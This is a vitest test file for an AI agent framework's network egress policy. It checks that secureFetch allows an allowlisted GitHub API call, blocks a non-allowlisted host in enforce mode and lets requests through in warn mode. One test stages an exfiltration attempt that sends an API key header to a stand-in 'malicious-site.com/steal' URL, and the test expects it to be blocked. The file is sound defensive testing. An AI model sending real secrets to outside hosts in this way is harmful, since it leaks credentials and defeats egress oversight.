import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest';
import axios from 'axios';
import { secureFetch } from '@agent/core';
import { resetEgressPolicyCache } from '@agent/core/egress-policy';

vi.mock('axios', () => ({
  default: vi.fn(),
}));

const originalEgressMode = process.env.KYBERION_EGRESS_POLICY;

describe('Network Governance Policy Enforcement', () => {
  beforeEach(() => {
    vi.mocked(axios).mockReset();
    vi.mocked(axios).mockResolvedValue({ data: { success: true } } as any);
  });

  afterAll(() => {
    if (originalEgressMode === undefined) delete process.env.KYBERION_EGRESS_POLICY;
    else process.env.KYBERION_EGRESS_POLICY = originalEgressMode;
    resetEgressPolicyCache();
  });

  function setEgressMode(mode: 'enforce' | 'warn'): void {
    process.env.KYBERION_EGRESS_POLICY = mode;
    resetEgressPolicyCache();
  }

  it('Scenario: Request to allowlisted domain (Allowed under enforce)', async () => {
    setEgressMode('enforce');
    const result = await secureFetch({
      url: 'https://api.github.com/user',
      headers: { 'Authorization': 'Bearer test-token' }
    });
    expect(result.success).toBe(true);
  });

  it('Scenario: Request to non-allowlisted domain (Blocked under enforce)', async () => {
    setEgressMode('enforce');
    try {
      await secureFetch({
        url: 'https://malicious-site.com/steal',
        headers: { 'X-API-KEY': 'secret-key' }
      });
      throw new Error('Should have been blocked');
    } catch (err: any) {
      expect(err.message).toContain('[NETWORK_POLICY_VIOLATION]');
    }
  });

  it('Scenario: Request to non-allowlisted domain (Allowed in warn observation mode, SA-04)', async () => {
    setEgressMode('warn');
    const result = await secureFetch({
      url: 'https://any-public-site.com/data'
    });
    expect(result.success).toBe(true);
  });
});
